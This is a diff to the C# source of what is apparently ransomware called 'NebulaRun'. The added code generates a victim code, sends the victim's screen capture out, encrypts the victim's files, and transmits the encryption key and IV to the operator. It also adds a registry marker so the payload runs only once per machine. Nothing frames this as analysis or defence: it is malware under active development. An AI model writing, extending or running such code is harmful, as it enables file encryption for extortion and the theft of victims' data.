@@ -1,19 +1,25 @@
 using System;
-using System.Net;
 using System.IO;
+using System.Net;
 using System.Reflection;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Microsoft.Win32;
 
 namespace NebulaRun
 {
 internal static class Program
 {
+    private const string RegKeyPath = @"Software\NebulaRun";
+    private const string RegValueName = "Marked";
+    private const string RegValueData = "1";
+
 	[STAThread]
 	private static void Main()
 	{
-		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12; /* Fixes Tls Error completely by forcing tls12 */
+		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
+
 		bool createdNew;
 		using (Mutex mutex = new Mutex(true, "NB111", out createdNew))
 		{
@@ -55,18 +61,49 @@ internal static class Program
 
 				Nbl.GenerateVictimCode();
 
-				Task.Run(delegate
+				bool alreadyMarked = false;
+				try
+				{
+					using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegKeyPath))
+					{
+						if (key != null && key.GetValue(RegValueName) != null)
+						{
+							alreadyMarked = true;
+						}
+					}
+				}
+				catch
+				{
+				}
+
+				if (!alreadyMarked)
 				{
 					try
 					{
+						Send.SendScreenshotAsync(Nbl.VictimCode);
+						Task.Delay(4000).Wait();
 						Nbl.EncryptAll();
 						Task.Delay(4000).Wait();
-						Send.SendKeyAndIvAsync(Nbl.GetBase64Key(), Nbl.GetBase64IV(), Nbl.VictimCode).GetAwaiter().GetResult();
+						Send.SendKeyAndIvAsync(Nbl.GetBase64Key(), Nbl.GetBase64IV(), Nbl.VictimCode);
 					}
 					catch
 					{
 					}
-				});
+
+					try
+					{
+						using (RegistryKey key = Registry.CurrentUser.CreateSubKey(RegKeyPath))
+						{
+							if (key != null)
+							{
+								key.SetValue(RegValueName, RegValueData, RegistryValueKind.String);
+							}
+						}
+					}
+					catch
+					{
+					}
+				}
 
 				Application.EnableVisualStyles();
 				Application.SetCompatibleTextRenderingDefault(false);
